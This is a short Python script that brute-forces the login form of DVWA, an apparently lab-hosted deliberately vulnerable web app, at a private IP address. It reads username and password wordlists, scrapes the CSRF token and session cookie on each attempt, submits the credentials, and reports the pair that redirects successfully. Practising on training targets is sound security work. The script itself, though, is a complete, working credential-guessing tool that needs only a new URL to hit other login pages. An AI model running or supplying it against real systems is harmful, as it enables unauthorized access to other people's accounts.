import requests,re,sys

class Error(Exception):
    pass

class found(Error):
    pass

#You have to create your own user.txt and password.txt file 

url='http://192.168.43.116/dvwa/login.php' #Enter correct ip address
user='user.txt' # This is the path of file containing the list of possible usernames
password='password.txt' # This is the path of file containing the list of possible password

m1=re.compile(r"<input type='hidden' name='user_token' value='.+' />")

try:
    u1=open('user.txt','r').readlines()
    p1=open('password.txt','r').readlines()
except:
    print('user or password file is not found')
    sys.exit(1)

try:
    for u2 in u1:
        for p2 in p1:
                u3=u2.strip('\n')
                p3=p2.strip('\n')
                with requests.Session() as s:
                    r = s.post(url)
                    token=m1.search(r.text).group(0)[46:-4]
                    ssid = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
                    ssid = ssid.group(1)
                    cookie={'security': 'low', 'PHPSESSID': ssid}
                    headers={'Host': '192.168.43.116', 'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:78.0) Gecko/20100101 Firefox/78.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '88', 'Origin': 'http://192.168.43.116', 'Connection': 'keep-alive', 'Referer': 'http://192.168.43.116/dvwa/login.php', 'Cookie': 'security=low; PHPSESSID={id}'.format(id=ssid), 'Upgrade-Insecure-Requests': '1'}
                    data="username={user}&password={password}&Login=Login&user_token={t}".format(t=token,user=u3,password=p3)
                    res=s.post(url,data=data,headers=headers,cookies=cookie,allow_redirects=False)
                    if 'index.php' in res.headers['Location']:
                        raise found
    print('nothing was found')             
except found:
    print('user is : '+u3)
    print('password is : '+p3)
